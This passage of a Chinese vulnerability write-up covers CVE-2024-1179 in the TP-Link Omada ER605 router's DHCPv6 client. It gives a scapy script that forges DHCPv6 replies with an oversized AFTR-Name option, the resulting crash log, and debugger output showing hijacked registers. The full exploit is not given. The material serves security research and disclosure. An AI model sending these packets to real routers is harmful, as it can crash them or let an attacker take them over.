 <span class="keyword">def</span> <span class="title function_">filter_reply</span>(<span class="params">pkt</span>):</span><br><span class="line">        <span class="keyword">return</span> DHCP6_Reply <span class="keyword">in</span> pkt <span class="keyword">and</span> pkt[DHCP6_Reply].trid == transaction_id</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 监听网络上的回应，持续5秒</span></span><br><span class="line">    response = sniff(iface=interface, <span class="built_in">filter</span>=<span class="string">"udp and port 546"</span>, prn=<span class="keyword">lambda</span> x: x.show(),</span><br><span class="line">                     lfilter=filter_reply, timeout=<span class="number">5</span>, count=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断是否收到回应</span></span><br><span class="line">    <span class="keyword">if</span> response:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"成功接收到DHCPv6回应。"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"未收到DHCPv6回应。"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请根据你的具体环境调整以下参数</span></span><br><span class="line">interface_name = <span class="string">"br0"</span>  <span class="comment"># Linux中的网络接口名称</span></span><br><span class="line"><span class="comment">#source_ipv6 = "fe80::8df1:7906:7b33:58d7"  # 源IPv6地址</span></span><br><span class="line">source_ipv6 = <span class="string">"fe80::21c:42ff:fee0:61cf"</span>  <span class="comment"># 源IPv6地址</span></span><br><span class="line">destination_ipv6 = <span class="string">"fe80::216:3eff:fe00:1"</span>  <span class="comment"># 目的IPv6地址（虚拟机内的dhcp6c客户端IPv6地址）</span></span><br><span class="line">source_mac = <span class="string">"00:0c:29:b2:c1:98"</span>  <span class="comment"># 源MAC地址</span></span><br><span class="line">destination_mac = <span class="string">"00:16:3E:00:00:01"</span>  <span class="comment"># 目的MAC地址（虚拟机内的网络接口MAC地址）</span></span><br><span class="line"><span class="comment">#transaction_id = 0x00abcdef  # 事务ID</span></span><br><span class="line">transaction_id = <span class="number">0x25d6bd</span>  <span class="comment"># 事务ID</span></span><br><span class="line">getAftrName = <span class="string">"a"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送DHCPv6 ADVERTISE消息</span></span><br><span class="line">send_dhcp6_reply_and_listen(interface_name, source_ipv6, destination_ipv6, source_mac, destination_mac, transaction_id)</span><br></pre></td></tr></tbody></table></figure>

<p>远程响应</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Mar/28/2024 02:41:42: client6_recv: receive reply from fe80::21c:42ff:fee0:61cf%eth0 on eth0</span><br><span class="line">Mar/28/2024 02:41:42: dhcp6_get_options: get DHCP option server ID, len 14</span><br><span class="line">Mar/28/2024 02:41:42:   DUID: 00:01:00:01:00:00:00:00:00:0c:29:b2:c1:98</span><br><span class="line">Mar/28/2024 02:41:42: dhcp6_get_options: get DHCP option client ID, len 14</span><br><span class="line">Mar/28/2024 02:41:42:   DUID: 00:01:00:01:00:00:00:00:00:16:3e:00:00:01</span><br><span class="line">Mar/28/2024 02:41:42: client6_recvreply: XID mismatch</span><br></pre></td></tr></tbody></table></figure>

<p>这个case 64通过fix版本进行查看的时候可以发现是aftr_name，scapy里好像没有，所以udp重放了一下流量，拿到bytes类型的Poc，同时在qemu里tcpdump抓了一个包，通过流量包分析出了格式</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000  07 25 d6 bd 00 02 00 0e  00 01 00 01 00 00 00 00   .%...... ........</span><br><span class="line">00000010  00 0c 29 b2 c1 98 00 01  00 0e 00 01 00 01 00 00   ..)..... ........</span><br><span class="line">00000020  00 00 00 16 3e 00 00 01 </span><br></pre></td></tr></tbody></table></figure>

<p>0x07是<code>Message type</code>、0x25d6bd是<code>Transaction ID</code>、0x0002是<code>option</code>、0x0e是<code>Length</code>、0001000100000000000c29b2c198是<code>DUID</code></p>
<p>我们需要控制的是option和length以及后面option对应的数据，控制option为64，length为payload的长度，对应的数据存放payload，这个payload格式需要符合after_name的格式</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   0                   1                   2                   3</span><br><span class="line">   0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">  +-------------------------------+-------------------------------+</span><br><span class="line">  |    OPTION_AFTR_NAME: 64       |          option-len           |</span><br><span class="line">  +-------------------------------+-------------------------------+</span><br><span class="line">  |                                                               |</span><br><span class="line">  |                  tunnel-endpoint-name (FQDN)                  |</span><br><span class="line">  |                                                               |</span><br><span class="line">  +---------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line">      OPTION_AFTR_NAME: 64</span><br><span class="line"></span><br><span class="line">            option-len: Length of the tunnel-endpoint-name field in</span><br><span class="line">                        octets.</span><br><span class="line"></span><br><span class="line">  tunnel-endpoint-name: A fully qualified domain name of the AFTR</span><br><span class="line">                        tunnel endpoint.</span><br><span class="line"></span><br><span class="line">              Figure 1: AFTR-Name DHCPv6 Option Format</span><br><span class="line"></span><br><span class="line">The tunnel-endpoint-name field is formatted as required in DHCPv6</span><br><span class="line">[RFC3315] Section 8 ("Representation and Use of Domain Names").</span><br><span class="line">Briefly, the format described is using a single octet noting the</span><br><span class="line">length of one DNS label (limited to at most 63 octets), followed by</span><br><span class="line">the label contents.  This repeats until all labels in the FQDN are</span><br><span class="line">exhausted, including a terminating zero-length label.  Any updates to</span><br><span class="line">Section 8 of DHCPv6 [RFC3315] also apply to encoding of this field.</span><br><span class="line">An example format for this option is shown in Figure 2, which conveys</span><br><span class="line">the FQDN "aftr.example.com.".</span><br><span class="line"></span><br><span class="line">   +------+------+------+------+------+------+------+------+------+</span><br><span class="line">   | 0x04 |   a  |   f  |   t  |   r  | 0x07 |   e  |   x  |   a  |</span><br><span class="line">   +------+------+------+------+------+------+------+------+------+</span><br><span class="line">   |   m  |   p  |   l  |   e  | 0x03 |   c  |   o  |   m  | 0x00 |</span><br><span class="line">   +------+------+------+------+------+------+------+------+------+</span><br></pre></td></tr></tbody></table></figure>

<p>简单来说就是每一串aftr_name字符串前都需要标明长度，从第二个开始长度会转成.，比如上面的例子中，当格式为<code>\x04aftr\x07example\x03com\x00</code>时，程序解析之后的结果为aftr.example.com，通过这样的格式我写出了以下crash Poc</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> scapy.layers.inet6 <span class="keyword">import</span> IPv6, UDP</span><br><span class="line"><span class="keyword">from</span> scapy.layers.dhcp6 <span class="keyword">import</span> DHCP6_Reply, DHCP6OptServerId, DHCP6OptClientId</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'mips'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\033[32m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\033[0m'</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'192.168.10.200'</span></span><br><span class="line">port = <span class="number">546</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_dhcp6_reply_and_listen</span>(<span class="params">interface, src_ipv6, dst_ipv6, src_mac, dst_mac, transaction_id</span>):</span><br><span class="line">    <span class="comment"># 构造以太网层</span></span><br><span class="line">    ether_layer = Ether(src=src_mac, dst=dst_mac)</span><br><span class="line">    li(ether_layer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造IPv6层</span></span><br><span class="line">    ipv6_layer = IPv6(src=src_ipv6, dst=dst_ipv6)</span><br><span class="line">    li(ipv6_layer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造UDP层</span></span><br><span class="line">    udp_layer = UDP(sport=<span class="number">547</span>, dport=<span class="number">546</span>)  <span class="comment"># 注意端口号，服务器端是547，客户端是546</span></span><br><span class="line">    li(udp_layer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造DHCPv6 REPLY消息</span></span><br><span class="line">    dhcp6_reply = DHCP6_Reply(trid=transaction_id)</span><br><span class="line">    li(dhcp6_reply)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造Server ID选项</span></span><br><span class="line">    server_id = DHCP6OptServerId(duid=DUID_LLT(hwtype=<span class="number">1</span>, lladdr=src_mac))</span><br><span class="line">    li(server_id)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造Client ID选项</span></span><br><span class="line">    client_id = DHCP6OptClientId(duid=DUID_LLT(hwtype=<span class="number">1</span>, lladdr=dst_mac))</span><br><span class="line">    <span class="comment">#li(client_id)</span></span><br><span class="line"></span><br><span class="line">    p1 = <span class="string">b'\x00\x40\x03\x00'</span></span><br><span class="line">    p2 = (<span class="string">b'\xff'</span> + <span class="string">b'a'</span> * <span class="number">0xff</span>) * <span class="number">3</span></span><br><span class="line">    li(<span class="built_in">hex</span>(<span class="built_in">len</span>(p2)))</span><br><span class="line">    p1 += p2</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 组合所有层</span></span><br><span class="line">    packet = ether_layer / ipv6_layer / udp_layer / dhcp6_reply / p1</span><br><span class="line">    li(<span class="built_in">bytes</span>(packet))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送数据包</span></span><br><span class="line">    sendp(packet)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"DHCPv6 Reply消息已发送，等待响应..."</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置监听过滤器，捕获DHCPv6 Solicit或Request等消息作为响应</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">filter_reply</span>(<span class="params">pkt</span>):</span><br><span class="line">        <span class="keyword">return</span> DHCP6_Reply <span class="keyword">in</span> pkt <span class="keyword">and</span> pkt[DHCP6_Reply].trid == transaction_id</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 监听网络上的回应，持续5秒</span></span><br><span class="line">    response = sniff(iface=interface, <span class="built_in">filter</span>=<span class="string">"udp and port 546"</span>, prn=<span class="keyword">lambda</span> x: x.show(),</span><br><span class="line">                     lfilter=filter_reply, timeout=<span class="number">5</span>, count=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断是否收到回应</span></span><br><span class="line">    <span class="keyword">if</span> response:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"成功接收到DHCPv6回应。"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"未收到DHCPv6回应。"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请根据你的具体环境调整以下参数</span></span><br><span class="line">interface_name = <span class="string">"br0"</span>  <span class="comment"># Linux中的网络接口名称</span></span><br><span class="line"><span class="comment">#source_ipv6 = "fe80::f421:a8ff:fe5a:ff0d"  # 源IPv6地址</span></span><br><span class="line">source_ipv6 = <span class="string">"fe80::21c:42ff:fee0:61cf"</span>  <span class="comment"># 源IPv6地址</span></span><br><span class="line">destination_ipv6 = <span class="string">"fe80::216:3eff:fe00:1"</span>  <span class="comment"># 目的IPv6地址（虚拟机内的dhcp6c客户端IPv6地址）</span></span><br><span class="line"><span class="comment">#destination_ipv6 = "fe80::21c:42ff:fee0:61cf"  # 目的IPv6地址（虚拟机内的dhcp6c客户端IPv6地址）</span></span><br><span class="line">source_mac = <span class="string">"00:0c:29:b2:c1:98"</span>  <span class="comment"># 源MAC地址</span></span><br><span class="line">destination_mac = <span class="string">"00:16:3E:00:00:01"</span>  <span class="comment"># 目的MAC地址（虚拟机内的网络接口MAC地址）</span></span><br><span class="line"><span class="comment">#transaction_id = 0x00abcdef  # 事务ID</span></span><br><span class="line">transaction_id = <span class="number">0x25d6bd</span>  <span class="comment"># 事务ID</span></span><br><span class="line">getAftrName = <span class="string">"a"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送DHCPv6 ADVERTISE消息</span></span><br><span class="line">send_dhcp6_reply_and_listen(interface_name, source_ipv6, destination_ipv6, source_mac, destination_mac, transaction_id)</span><br></pre></td></tr></tbody></table></figure>

<p>远程crash</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Mar/28/2024 06:42:03: client6_recv: receive reply from fe80::21c:42ff:fee0:61cf%eth0 on eth0</span><br><span class="line">Mar/28/2024 06:42:03: dhcp6_get_options: get DHCP option opt_64, len 768</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></tbody></table></figure>

<p>gdbserver调试之后发现在memcpy这里产生了崩溃</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">*V0   0x7fbda0e0 ◂— 0x61616161 (<span class="string">'aaaa'</span>)</span><br><span class="line">*V1   0x7fbdb004</span><br><span class="line">*A0   0x7fbdab15 ◂— 0x61616161 (<span class="string">'aaaa'</span>)</span><br><span class="line">*A1   0x7fbd9c05 ◂— 0x61616161 (<span class="string">'aaaa'</span>)</span><br><span class="line">*A2   0xfffffffc</span><br><span class="line">*A3   0x61616161 (<span class="string">'aaaa'</span>)</span><br><span class="line">*T0   0x61616161 (<span class="string">'aaaa'</span>)</span><br><span class="line">*T1   0xfffff0db</span><br><span class="line">*T2   0x7fbda0e4 ◂— 0x61616161 (<span class="string">'aaaa'</span>)</span><br><span class="line">*T3   0x61000000</span><br><span class="line">*T4   0x706f2050 (<span class="string">'P op'</span>)</span><br><span class="line"> T5   0x0</span><br><span class="line"> T6   0xe</span><br><span class="line">*T7   0x6e6f6974 (<span class="string">'tion'</span>)</span><br><span class="line">*T8   0x42a06c —▸ 0x77f2cefc ◂— move <span class="variable">$v0</span>, <span class="variable">$a0</span></span><br><span class="line">*T9   0x77f2cefc ◂— move <span class="variable">$v0</span>, <span class="variable">$a0</span></span><br><span class="line">*S0   0x7fbd9c00 ◂— 0x616161ff</span><br><span class="line">*S1   0x7fbd9ff8 ◂— 0x0</span><br><span class="line"> S2   0x5</span><br><span class="line"> S3   0x4018b1 —▸ 0x64f2f0 ◂— 0x0</span><br><span class="line"> S4   0x77f5b000</span><br><span class="line"> S5   0x77f5b000</span><br><span class="line"> S6   0x77f5e518 —▸ 0x77ebb000 ◂— 0x464c457f</span><br><span class="line"> S7   0x77f5fd8c ◂— 1</span><br><span class="line"> S8   0x0</span><br><span class="line"> GP   0x77f652c0</span><br><span class="line"> FP   0x0</span><br><span class="line">*SP   0x7fbd9720 ◂— 0x7</span><br><span class="line">*PC   0x77f2d1b4 ◂— sw <span class="variable">$t0</span>, -4(<span class="variable">$v1</span>)</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────[ DISASM / mips / <span class="built_in">set</span> <span class="built_in">emulate</span> on ]──────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x77f2d1b4    sw     <span class="variable">$t0</span>, -4(<span class="variable">$v1</span>)</span><br><span class="line">   0x77f2d1b8    sltiu  <span class="variable">$t0</span>, <span class="variable">$t1</span>, 0x13</span><br><span class="line">   0x77f2d1bc    beqz   <span class="variable">$t0</span>, 0x77f2d160</span><br><span class="line"></span><br><span class="line">   0x77f2d1c0    addiu  <span class="variable">$a0</span>, <span class="variable">$a0</span>, 0x10</span><br><span class="line">   0x77f2d1c4    addiu  <span class="variable">$a3</span>, <span class="variable">$a2</span>, -0x14</span><br><span class="line">   0x77f2d1c8    srl    <span class="variable">$a3</span>, <span class="variable">$a3</span>, 4</span><br><span class="line">   0x77f2d1cc    addiu  <span class="variable">$v1</span>, <span class="variable">$a3</span>, 1</span><br><span class="line">   0x77f2d1d0    sll    <span class="variable">$v1</span>, <span class="variable">$v1</span>, 4</span><br><span class="line">   0x77f2d1d4    addiu  <span class="variable">$a2</span>, <span class="variable">$a2</span>, -0x11</span><br><span class="line">   0x77f2d1d8    sll    <span class="variable">$a3</span>, <span class="variable">$a3</span>, 4</span><br><span class="line">   0x77f2d1dc    addu   <span class="variable">$a1</span>, <span class="variable">$a1</span>, <span class="variable">$v1</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ sp 0x7fbd9720 ◂— 0x7</span><br><span class="line">01:0004│    0x7fbd9724 —▸ 0x413f34 ◂— <span class="string">'dhcp6_get_options'</span></span><br><span class="line">02:0008│    0x7fbd9728 —▸ 0x4137e4 ◂— addi <span class="variable">$s4</span>, <span class="variable">$v1</span>, 0x6567 /* <span class="string">'get DHCP option %s, len %d'</span> */</span><br><span class="line">03:000c│    0x7fbd972c —▸ 0x42a758 ◂— <span class="string">'opt_64'</span></span><br><span class="line">04:0010│    0x7fbd9730 ◂— 0x300</span><br><span class="line">05:0014│    0x7fbd9734 ◂— <span class="string">'&lt;8&gt;Mar 28 06:46:46 : '</span></span><br><span class="line">06:0018│    0x7fbd9738 ◂— <span class="string">'ar 28 06:46:46 : '</span></span><br><span class="line">07:001c│    0x7fbd973c ◂— <span class="string">'8 06:46:46 : '</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0 0x77f2d1b4</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">     Start        End Perm     Size Offset File</span><br><span class="line">  0x400000   0x41a000 r-xp    1a000      0 /usr/sbin/dhcp6c</span><br><span class="line">  0x42a000   0x42b000 rw-p     1000  1a000 /usr/sbin/dhcp6c</span><br><span class="line">  0x42b000   0x42c000 rwxp     1000      0 [anon_0042b]</span><br><span class="line">  0x647000   0x69c000 rwxp    55000      0 [heap]</span><br><span class="line">0x77d53000 0x77d6c000 r-xp    19000      0 /lib/libeasylogger.so</span><br><span class="line">0x77d6c000 0x77d6d000 rw-p     1000   9000 /lib/libeasylogger.so</span><br><span class="line">0x77d6d000 0x77d72000 rw-p     5000      0 [anon_77d6d]</span><br><span class="line">0x77d72000 0x77d87000 r-xp    15000      0 /lib/libubox.so</span><br><span class="line">0x77d87000 0x77d88000 rw-p     1000   5000 /lib/libubox.so</span><br><span class="line">0x77d88000 0x77e6f000 r-xp    e7000      0 /usr/lib/libiconv.so.2</span><br><span class="line">0x77e6f000 0x77e70000 rw-p     1000  d7000 /usr/lib/libiconv.so.2</span><br><span class="line">0x77e70000 0x77e86000 r-xp    16000      0 /lib/libuci.so</span><br><span class="line">0x77e86000 0x77e87000 rw-p     1000   6000 /lib/libuci.so</span><br><span class="line">0x77e87000 0x77ea9000 r-xp    22000      0 /lib/libgcc_s.so.1</span><br><span class="line">0x77ea9000 0x77eaa000 rw-p     1000  12000 /lib/libgcc_s.so.1</span><br><span class="line">0x77eaa000 0x77eba000 r-xp    10000      0 /usr/lib/liblogger.so</span><br><span class="line">0x77eba000 0x77ebb000 rw-p     1000      0 /usr/lib/liblogger.so</span><br><span class="line">0x77ebb000 0x77f4d000 r-xp    92000      0 /lib/ld-musl-mipsel-sf.so.1</span><br><span class="line">0x77f5c000 0x77f5e000 rw-p     2000  91000 /lib/ld-musl-mipsel-sf.so.1</span><br><span class="line">0x77f5e000 0x77f60000 rwxp     2000      0 [anon_77f5e]</span><br><span class="line">0x7fbba000 0x7fbdb000 rw-p    21000      0 [stack]</span><br><span class="line">0x7fff7000 0x7fff8000 r-xp     1000      0 [vdso]</span><br><span class="line">pwndbg&gt; p/x 0x77f2d1b4-0x77ebb000</span><br><span class="line"><span class="variable">$1</span> = 0x721b4</span><br></pre></td></tr></tbody></table></figure>

<p>此时可以看到寄存器已经被劫持，exp这里就不详细展开了，至此Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605漏洞分析完成</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://www.zerodayinitiative.com/advisories/ZDI-24-085/">https://www.zerodayinitiative.com/advisories/ZDI-24-085/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.arvik.top/article/51536621.html">https://www.arvik.top/article/51536621.html</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/653315890">https://zhuanlan.zhihu.com/p/653315890</a></p>
<p><a target="_blank" rel="noopener" href="https://community.cisco.com/t5/%E7%BD%91%E7%BB%9C%E6%96%87%E6%A1%A3/%E5%8E%9F%E5%88%9B-dhcpv6-%E8%AF%A6%E6%83%85%E5%8F%8A%E5%85%B6%E6%8A%A5%E6%96%87%E4%BB%8B%E7%BB%8D-%E9%99%84%E9%85%8D%E7%BD%AE%E6%A1%88%E4%BE%8B%E5%8F%8A%E9%AA%8C%E8%AF%81%E5%91%BD%E4%BB%A4/ta-p/4372251">https://community.cisco.com/t5/%E7%BD%91%E7%BB%9C%E6%96%87%E6%A1%A3/%E5%8E%9F%E5%88%9B-dhcpv6-%E8%AF%A6%E6%83%85%E5%8F%8A%E5%85%B6%E6%8A%A5%E6%96%87%E4%BB%8B%E7%BB%8D-%E9%99%84%E9%85%8D%E7%BD%AE%E6%A1%88%E4%BE%8B%E5%8F%8A%E9%AA%8C%E8%AF%81%E5%91%BD%E4%BB%A4/ta-p/4372251</a></p>
<p><a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc6334">https://datatracker.ietf.org/doc/html/rfc6334</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li>
         
          <li><a href="/links/">links</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn2Own-TORONTO-2023-CVE-2024-1179-amp-TP-Link-Omada-ER605"><span class="toc-number">1.</span> <span class="toc-text">Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D-amp-%E5%9B%BA%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.1.</span> <span class="toc-text">介绍&amp;固件下载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F"><span class="toc-number">1.3.</span> <span class="toc-text">固件模拟</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Poc"><span class="toc-number">1.4.</span> <span class="toc-text">Poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.5.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/&amp;text=Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
